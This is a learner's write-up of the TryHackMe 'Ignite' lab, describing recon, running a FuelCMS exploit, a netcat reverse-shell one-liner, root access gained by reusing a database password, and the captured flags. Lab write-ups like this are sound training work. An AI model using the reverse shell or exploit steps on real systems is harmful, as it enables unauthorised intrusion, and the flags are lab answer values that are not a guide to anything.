# Ignite

**Platform:** TryHackMe
**Date:** date:2026-03-24
**Difficulty:** easy
**Category:** Web Hacking, FuelCMS Vulnerability
**Room URL:** https://tryhackme.com/room/ignite
**Status:** ✅ Completed

---

## 📌 What Was This Room About?
> This room was a bout using FuelCMS vulnerability to hack into a web server to gain root access and locate the flag.txt file.

---

## 🔍 Reconnaissance
> What was the first thing you did? Always start with recon.

### Nmap Scan
```bash
# nmap command
nmap -sS -Pn -p- -T4 -v 10.128.176.23
```

**Results:**![[Screenshot 2026-03-26 at 3.22.27 PM.png]]

---

## 🧭 Steps I Took

> Write each step in order. Explain WHY you did it, not just WHAT you did.

### Step 1 — 
- **What I did:** The first thing I did was what I normally do with these challenges, I poked around the source code in the website. I was trying to find anything interesting but at that time I saw nothing.

### Step 2 — 
- **What I did:** I used [[dirb]] to find hidden directory's in that website. I found quite a bunch of directories, but the one the interested me the most was this directory: http://10.129.132.36/robots.txt. I was interested in this because in another challenge robots.txt was the file that contained not only a secret login page, but also the login page's password. So I went there and I only saw a secret directory that, like in that previous challenge, took me a secret login page.
- **Command/Tool used:**
```bash
# dirb 10.129.132.36
```
- **What I found:** I found out that doing sometimes these TryHackMe challenges are somehow connected.

### Step 3 — 
- **What I did:** I tried to go into the source code again but saw nothing interesting except for a hexedecimal number, that when decoded was this: fuel/dashboard. This was a secret directory but when I tried it, it just took me back to the login page. It seemed that that website had Session Management so I wasn't able to enter this directory without going back into the login page. After probing around the source code for a while and having know luck I decided to go and seek help with a walkthrough.
- **Command/Tool used:**
```bash
# no command
```
- **What I found:** I found that I should not underestimate these virtual websites. Even though at the top bar of the browser it says 'not secure' it doesn't mean it is going to just put the flag in the source code.
- **Why it matters:** This matters because I won't waste time.

### Step 4 — 
- **What I did:** I found a youtube walkthrough tutorial that walked me through how to get around Ignite, but he wasn't very helpful. He helped me discover that to be able to gain access to the website I had to download an exploit called FuelCMS and run it. But when It came to running it, that was difficult. I used the command he used which was python 47138.py, It worked but when I tried to run **rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.128.121.176 53>/tmp/f** to gain remote shell access to the website but all I got was 'A PHP error was encounted'. I tried to fix my command some bugs in it but it did not work so I tried a new approach I asked Gemini to help me, and apparently I was listening on the wrong port. Before I was listening or port 53 but port 4444 was more reliable so I changed my code to: **rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.128.121.176 4444 >/tmp/f** and I got a reverse shell with netcat.
- **Command/Tool used:**
```bash
# python 43138.py
# nc 4444(at first it was nc -l 53 but I changed it)
# **rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.128.121.176 4444 >/tmp/f**
```
- **What I found:** I found that listening on an unrealiable port can lead to you spending 30 minutes trying to fix it. 
- **Why it matters:** This matters because now i know not to listen on port 53 but my default port should be 4444.

### Step 5 — 
- **What I did:** I was able to get a shell in my netcat terminal and before I started the fun stuff, I had to run python -c 'import pty; pty.spawn("/bin/bash")' to stabilise the shell. After that, I dug around in the directories a bit before I found my first flag in user.txt - `6470e394cbf6dab6a91682cc8585059b`

- I then tried to find the flag in root.txt that one was also quite simple. I did some more digging one the machine and found database.php, then I cat the file and I got this: 

$db 'default'
array(
'dsn'
'hostname'
'localhost'
'username' => 'root',
##### **'password' ⇒ 'mememe'**
'database'
'fuel_schema
'dbdriver' => 'mysqli',
'dbprefix' ⇒
'pconnect' ⇒ FALSE,=
);
'db_debug' ⇒ (ENVIRONMENT 'production'),
'cache_on'⇒ FALSE,
'cachedir' ⇒
..
'char_set' ⇒ 'utf8',
'dbcollat'
'swap_pre' ⇒
'utf8_general_ci',
'encrypt'⇒ FALSE,
'compress' ⇒ FALSE, 'stricton'⇒ FALSE, 'failover' array(), 'save_queries' ⇒ TRUE

As you can see I put in bold the most interesting part of this entire database, The PASSWORD. So I tried the simple sudo - and (that command gets you into the root account with a password) when I was prompted for the password I inputed mememe and i was in the root account.

- **Command/Tool used:**
```bash
# python -c 'import pty; pty.spawn("/bin/bash")'
# cat database.php
# sudo -
```
- **What I found:** I found that sometimes uninteresting files have very important information, and also have a very good youtube video to help you find that because you ended up spending more time than nessasary trying to find the password.
- **Why it matters:** This matters because now I know to pay more attention to everything on a target machine.

### Step  6 — 
- **What I did:** This was it, this was what i spent 1 hour and 30 minutes trying to get the root.txt file on the root account. In my head i thought I would have to do more file digging and it would take another 30 minutes to find it, but apparently root.txt was the only file on the machine so when I typed `ls` I saw root.txt - `b9bbcb33e11b80be759c4e844862482d`
- **Command/Tool used:**
```bash
# ls
```
- **What I found:** I found the flag.
---

## 🛠 Commands Used

| Command                                                                                   | What It Does                                         |
| ----------------------------------------------------------------------------------------- | ---------------------------------------------------- |
| `nmap -sS -Pn -p- -T4 -v 10.128.176.23`                                                   | scans the website for open ports                     |
| `[[dirb]] 10.129.132.36`                                                                  | scans the website for hidden directories             |
| `python 43138.py`                                                                         | runs the fuelCMS exploit                             |
| `nc 4444(at first it was nc -l 53 but I changed it)`                                      | starts a listener                                    |
| `**rm /tmp/f;mkfifo /tmp/f;cat /tmp/f\|/bin/sh -i 2>&1\|nc 10.128.121.176 4444 >/tmp/f**` | this payload forces a connection with the web server |
| `python -c 'import pty; pty.spawn("/bin/bash")'`                                          | stabilises the shell connection                      |
| `cat database.php`                                                                        | lists the contents of database.php                   |
| `sudo -`                                                                                  | enters root account                                  |
| `ls`                                                                                      | lists a directory                                    |

---

## 🚩 Flags Found

| Flag      | Value                              |
| --------- | ---------------------------------- |
| User flag | `6470e394cbf6dab6a91682cc8585059b` |
| Root flag | `b9bbcb33e11b80be759c4e844862482d` |

---

## 💡 What I Learned
> Most important section. Write at least 3 bullet points.

-  I found that I should not underestimate these virtual websites. Even though at the top bar of the browser it says 'not secure' it doesn't mean it is going to just put the flag in the source code.
-  I found that listening on an unrealiable port can lead to you spending 30 minutes trying to fix it. 

---

## ❓ What Confused Me / What to Research Next
> Be honest. This is where real learning happens.

- PHP
- Privilage Escalation

---

## 🔗 Linked Notes
> Connect this report to your concept and tool notes.

- [[dirb]]

---

## 📎 Resources Used
> Links to tutorials, writeups, or documentation that helped you.

-  Ignite Walkthrough - https://www.youtube.com/watch?v=f0lDZEBa3_I&t=543s
-  Exploit Database FuelCMS - https://www.exploit-db.com/exploits/47138
- PentestMonkey Reverse Shell Cheat-sheet - https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet

---
*Report written in [[TryHackMe Vault]] — part of my ethical hacking journey 🛡️*